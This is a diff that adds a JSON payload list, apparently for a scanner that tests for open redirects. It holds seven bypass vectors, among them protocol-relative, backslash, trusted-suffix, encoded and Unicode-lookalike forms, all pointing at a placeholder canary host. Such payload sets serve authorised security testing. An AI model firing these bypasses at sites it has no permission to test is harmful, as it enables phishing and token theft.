@@ -1,0 +1,42 @@
+{
+  "class": "open_redirect",
+  "order": "bypass-first",
+  "note": "Redirect param ladders: absolute, protocol-relative, encoded, and allowlist bypasses. Verify with follow_redirects=never.",
+  "payloads": [
+    {
+      "id": "redirect::01",
+      "vector": "https://oob.example.net/{CANARY}",
+      "note": "full absolute URL"
+    },
+    {
+      "id": "redirect::02",
+      "vector": "//oob.example.net/{CANARY}",
+      "note": "protocol-relative — classic allowlist bypass"
+    },
+    {
+      "id": "redirect::03",
+      "vector": "///oob.example.net/{CANARY}",
+      "note": "triple slash variant"
+    },
+    {
+      "id": "redirect::04",
+      "vector": "/\\oob.example.net/{CANARY}",
+      "note": "backslash confusion (browser normalization)"
+    },
+    {
+      "id": "redirect::05",
+      "vector": "https://trusted.example.com.oob.example.net/{CANARY}",
+      "note": "suffix-of-trusted bypass"
+    },
+    {
+      "id": "redirect::06",
+      "vector": "https://oob.example.net%2F%2Ftrusted.example.com",
+      "note": "encoded split — parser confusion"
+    },
+    {
+      "id": "redirect::07",
+      "vector": "https:οoob.example.net/{CANARY}",
+      "note": "unicode lookalike scheme"
+    }
+  ]
+}
